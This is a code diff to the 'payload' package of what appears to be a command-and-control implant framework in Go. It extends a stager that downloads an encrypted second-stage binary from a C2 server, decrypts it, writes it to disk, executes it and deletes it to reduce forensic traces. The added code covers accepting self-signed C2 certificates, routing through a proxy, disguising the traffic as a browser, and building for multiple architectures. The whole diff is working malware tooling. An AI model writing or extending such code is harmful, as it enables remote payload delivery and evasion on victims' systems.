@@ -1,6 +1,7 @@
 package payload
 
 import (
+	"context"
 	"crypto/hmac"
 	"crypto/rand"
 	"crypto/sha256"
@@ -10,6 +11,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 )
 
@@ -26,6 +28,10 @@ type StagerFetch struct {
 	Token   string // hex-encoded 32-byte stage token
 	Sig     string // url-safe base64 HMAC signature of the token
 	KeyHex  string // hex-encoded AES-256-GCM key for the stage blob
+	// HTTPS / transport hardening for the stager download.
+	SkipTLSVerify bool   // accept self-signed C2 TLS certificates
+	Proxy         string // optional upstream HTTP proxy URL
+	UserAgent     string // custom User-Agent (default mimics a browser)
 }
 
 func stageKey() ([]byte, error) {
@@ -151,22 +157,46 @@ const tokenStagerSrc = `package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/tls"
 	"encoding/hex"
 	"io"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
+	"time"
 )
 
 var (
-	BaseURL string
-	Token   string
-	Sig     string
-	KeyHex  string
+	BaseURL    string
+	Token      string
+	Sig        string
+	KeyHex     string
+	SkipTLS    string
+	ProxyURL   string
+	UserAgent  string
 )
 
 func main() {
-	resp, err := http.Get(BaseURL + "/stage/" + Token + "?s=" + Sig)
+	transport := &http.Transport{}
+	if SkipTLS == "true" {
+		transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	}
+	if ProxyURL != "" {
+		if pu, err := url.Parse(ProxyURL); err == nil {
+			transport.Proxy = http.ProxyURL(pu)
+		}
+	}
+	client := &http.Client{Transport: transport, Timeout: 30 * time.Second}
+
+	req, err := http.NewRequest("GET", BaseURL+"/stage/"+Token+"?s="+Sig, nil)
+	if err != nil {
+		os.Exit(1)
+	}
+	if UserAgent != "" {
+		req.Header.Set("User-Agent", UserAgent)
+	}
+	resp, err := client.Do(req)
 	if err != nil {
 		os.Exit(1)
 	}
@@ -202,8 +232,8 @@ func main() {
 	if err != nil {
 		os.Exit(1)
 	}
-	defer tmpFile.Close()
 	if _, err := tmpFile.Write(data); err != nil {
+		tmpFile.Close()
 		os.Exit(1)
 	}
 	tmpPath := tmpFile.Name()
@@ -211,7 +241,18 @@ func main() {
 	if err := os.Chmod(tmpPath, 0755); err != nil {
 		os.Exit(1)
 	}
-	exec.Command(tmpPath).Start()
+	cmd := exec.Command(tmpPath)
+	if err := cmd.Start(); err != nil {
+		os.Remove(tmpPath)
+		os.Exit(1)
+	}
+	cmd.Process.Release()
+	// Best-effort self-cleanup of the dropped stage-2 to limit on-disk OPSEC
+	// footprint once the child has loaded and begun executing.
+	go func() {
+		time.Sleep(500 * time.Millisecond)
+		os.Remove(tmpPath)
+	}()
 }
 `
 
@@ -261,11 +302,14 @@ func buildTokenStager(cfg ImplantConfig, outputDir string, fetch StagerFetch, go
 		return s
 	}
 
-	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.BaseURL=%s" -X "main.Token=%s" -X "main.Sig=%s" -X "main.KeyHex=%s"`,
+	ldflags := fmt.Sprintf(`-s -w -buildid= -X "main.BaseURL=%s" -X "main.Token=%s" -X "main.Sig=%s" -X "main.KeyHex=%s" -X "main.SkipTLS=%s" -X "main.ProxyURL=%s" -X "main.UserAgent=%s"`,
 		escape(fetch.BaseURL),
 		escape(fetch.Token),
 		escape(fetch.Sig),
 		escape(fetch.KeyHex),
+		strconv.FormatBool(fetch.SkipTLSVerify),
+		escape(fetch.Proxy),
+		escape(fetch.UserAgent),
 	)
 
 	outName := cfg.Filename
@@ -301,13 +345,19 @@ func buildTokenStager(cfg ImplantConfig, outputDir string, fetch StagerFetch, go
 		return "", fmt.Errorf("go executable not found in PATH")
 	}
 
-	tidyCmd := exec.Command(goCmd, "mod", "tidy")
+	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
+	defer cancel()
+
+	tidyCmd := exec.CommandContext(ctx, goCmd, "mod", "tidy")
 	tidyCmd.Dir = tmpDir
 	if out, err := tidyCmd.CombinedOutput(); err != nil {
+		if ctx.Err() == context.DeadlineExceeded {
+			return "", fmt.Errorf("go mod tidy timed out after %s: %w", buildTimeout, err)
+		}
 		return "", fmt.Errorf("go mod tidy failed: %w\n%s", err, string(out))
 	}
 
-	cmd := exec.Command(goCmd, "build",
+	cmd := exec.CommandContext(ctx, goCmd, "build",
 		"-ldflags", ldflags,
 		"-o", outPath,
 		"-trimpath",
@@ -315,16 +365,23 @@ func buildTokenStager(cfg ImplantConfig, outputDir string, fetch StagerFetch, go
 		".",
 	)
 	cmd.Dir = tmpDir
+	goarch, err := resolveBuildArch(goos, cfg.Architecture)
+	if err != nil {
+		return "", err
+	}
 	cmd.Env = append(os.Environ(),
 		"GOOS="+goos,
-		"GOARCH=amd64",
+		"GOARCH="+goarch,
 		"CGO_ENABLED=0",
 	)
 
 	var stderr strings.Builder
 	cmd.Stderr = &stderr
 	if err := cmd.Run(); err != nil {
-		return "", fmt.Errorf("stager build failed: %w\n%s", err, stderr.String())
+		if ctx.Err() == context.DeadlineExceeded {
+			return "", fmt.Errorf("stager build timed out after %s: %w", buildTimeout, err)
+		}
+		return "", fmt.Errorf("stager build failed: %w\n%s", err, scrubBuildLog(stderr.String(), ldflags))
 	}
 	if _, err := os.Stat(outPath); err != nil {
 		return "", fmt.Errorf("stager build succeeded but no output: %w", err)
